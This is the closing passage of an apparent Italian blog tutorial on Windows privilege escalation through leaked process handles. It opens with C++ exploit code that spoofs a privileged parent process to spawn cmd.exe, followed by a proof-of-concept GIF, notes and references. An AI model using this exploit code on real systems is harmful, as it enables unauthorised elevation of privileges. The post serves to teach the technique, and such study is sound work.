UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &clonedHandle, sizeof(HANDLE), NULL, NULL);
sinfo.lpAttributeList = ptList;
std::wstring commandline = L"C:\\Windows\\System32\\cmd.exe";

auto success = CreateProcessW(
	nullptr,
	&commandline[0],
	NULL,
	NULL,
	true,
	EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
	NULL,
	NULL,
	&sinfo.StartupInfo,
	&pinfo);
CloseHandle(pinfo.hProcess);
CloseHandle(pinfo.hThread);
```

Vediamo il tutto in azione 😊

[![poc gif](/img/handles5.gif)](/img/handles5.gif)

Alcune note:
- Se il processo a media integrità appartiene a un altro utente, non sarà possibile aprirlo in quanto sarebbe necessario il privilegio `SeDebugPrivilege`   
- In questo post abbiamo volontariamente lasciato l'implementazione dell'exploit sui thread come esercizio per il lettore 😉

Questo è quanto per oggi, alla prossima.

_last out!_

## Referenze
- [https://rayanfam.com/topics/reversing-windows-internals-part1/](https://rayanfam.com/topics/reversing-windows-internals-part1/)
- [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/leaked-handle-exploitation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/leaked-handle-exploitation)
- [http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)
